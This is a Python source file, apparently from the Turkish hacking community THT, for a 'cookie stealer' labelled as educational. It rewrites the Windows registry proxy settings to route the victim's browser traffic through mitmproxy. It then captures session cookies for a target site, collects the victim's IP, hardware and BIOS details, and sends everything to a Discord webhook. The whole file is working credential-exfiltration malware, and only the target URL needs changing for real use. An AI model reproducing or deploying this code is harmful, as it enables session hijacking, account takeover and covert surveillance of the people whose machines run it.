import asyncio, winreg, platform, GPUtil, cpuinfo, uuid, wmi, json, requests
from mitmproxy import options, http
from mitmproxy.tools import dump
from rich.console import Console
from discord_webhook import DiscordWebhook, DiscordEmbed
from bs4 import BeautifulSoup

console = Console(width=100)
console.print(f"[bold dark_orange]THT COOKIE STEALER (EĞİTİM AMAÇLIDIR / FOR EDUCATION)[/bold dark_orange]", no_wrap=True)

# SECTION Kodun çalışması için genel ayarlar.
LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 1881
NET_DUMP_LOG = False
START_PROXY_WHEN_OPENING = True
WEBHOOK_URL = "https://discord.com/api/webhooks/1263589616133476404/zfXIhI40vgT234231i7s-Dui-lt_aPSV3MqrBsJwW0CI4NXvkiptiM9IFCUlJD7wzZfkMhd" # NOTE Bu webhook discord üzerinden silinmiştir örnek olarak koyulmuştur.
# !SECTION

# SECTION Proxy ayarlarını bu iki fonksiyon yapılandırır.
def set_proxy_settings():
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                      r"Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0,
                                      winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, "ProxyEnable", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(registry_key, "ProxyServer", 0, winreg.REG_SZ,
                          f"{LISTEN_HOST}:{str(LISTEN_PORT)}")
        winreg.FlushKey(registry_key)
        winreg.CloseKey(registry_key)
    except Exception as e:
        print("Proxy ayarlarını güncellemede bir hata oluştu:", e)

def disable_proxy_settings():
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                      r"Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0,
                                      winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
        winreg.FlushKey(registry_key)
        winreg.CloseKey(registry_key)
    except Exception as e:
        print("Proxy ayarları kaldırılırken bir hata meydana geldi:", e)
# !SECTION

# SECTION HTML kodları aralalığı almak için method.
def parse_html(text, start, end):
    try:
        return text.split(start)[1].split(end)[0]
    except:
        return None
# !SECTION

# SECTION Yazılım çalıştığı cihazın bilgilerini çeker.
def get_system_info():
    cpu_info = cpuinfo.get_cpu_info()
    c = wmi.WMI()

    bios_info = c.Win32_BIOS()[0]

    system_info = {
        "device_name": platform.node(),
        "os": platform.system(),
        "os_version": platform.version(),
        "platform": platform.platform(),
        "processor": cpu_info.get('brand_raw', 'Unknown'),
        "bios": {
            "manufacturer": bios_info.Manufacturer,
            "version": bios_info.Version,
            "release_date": bios_info.ReleaseDate
        },
        "hwid": str(uuid.UUID(int=uuid.getnode())),
        "gpus": []
    }

    gpus = GPUtil.getGPUs()
    for gpu in gpus:
        gpu_info = {
            "id": gpu.id,
            "name": gpu.name,
            "driver_version": gpu.driver,
        }
        system_info["gpus"].append(gpu_info)
    
    return system_info
# !SECTION

# SECTION Yazılım açıldığında otomatik olarak sistem proxysini ayarlar.
# NOTE İsteğe bağlı genel ayarlardan kapatılabilir.
if START_PROXY_WHEN_OPENING:
    set_proxy_settings()
# !SECTION

# SECTION Yazılım ana kod parçacığı.
class RequestLogger:
    async def response(self, flow: http.HTTPFlow):
        if str(flow.request.url).startswith("https://sandbox.oniyevski.com/cookie-stealer"): # Buradaki bağlantı, 103. satırdaki divin yakalanacağı sayfaynın olduğu bağlantıdır.
            get_cookies = flow.request.headers.get("cookie", None)
            if get_cookies is not None:
                get_cookies = get_cookies.replace(", ", "; ")
                original_content = flow.response.get_text()
                soup = BeautifulSoup(original_content, 'html.parser')
                soup = str(soup)
                login_check = parse_html(soup, '<div class="alert alert-success">', '</div>') # Ben sandbox içerisindeki alert divinden kullanıcının siteye giriş yapıp yapmadığını kontrol etmek için, div üzerinden bir yakalama gerçekleştirdim.
                if login_check == "Session ve cookie verileri ile giriş yaptınız.":
                    disable_proxy_settings()
                    try:
                        get_ip_adress = requests.get("http://ip-api.com/json/", verify=False).json()
                        get_ip_adress = json.dumps(get_ip_adress, indent=4, ensure_ascii=False)
                    except:
                        get_ip_adress = "Bulunamadı."
                    system_info = get_system_info()
                    system_info = json.dumps(system_info, indent=4)
                    webhook = DiscordWebhook(url=WEBHOOK_URL)
                    embed = DiscordEmbed(title="MITM PROXY", description="Yeni bir cookie verisi yakalandı.", color="03b2f8")
                    embed.add_embed_field(name="İstek Yollanılan Adres", value=flow.request.url, inline=False)
                    embed.add_embed_field(name="IP Bilgisi", value=f"```json\n{get_ip_adress}```", inline=False)
                    embed.add_embed_field(name="Cihaz Bilgisi", value=f"```json\n{system_info}```", inline=False)
                    embed.set_footer(text="THT COOKIE STEALER", icon_url="https://upload.wikimedia.org/wikipedia/commons/2/2e/T%C3%BCrkHackTeam_Logo.png")
                    embed.set_timestamp()
                    webhook.add_file(get_cookies, f"cookies.txt")
                    webhook.add_embed(embed)
                    try:
                        webhook.execute()
                    except Exception as e:
                        print(e)
                    set_proxy_settings()
# !SECTION

# SECTION Yazılımın asenkron çalışması için gereken kısımlar.
async def start_proxy(host, port):
    opts = options.Options(listen_host=host, listen_port=port)
    master = dump.DumpMaster(
        opts,
        with_termlog=NET_DUMP_LOG,
        with_dumper=NET_DUMP_LOG,
    )
    master.addons.add(RequestLogger())
    await master.run()
    return master

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

async def create_tasks_func(host, port):
    tasks = []
    tasks.append(asyncio.create_task(start_proxy(host, port)))
    await asyncio.wait(tasks)

def main():
    try:
        loop.run_until_complete(create_tasks_func(LISTEN_HOST, LISTEN_PORT)) 
        loop.close()
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()
# !SECTION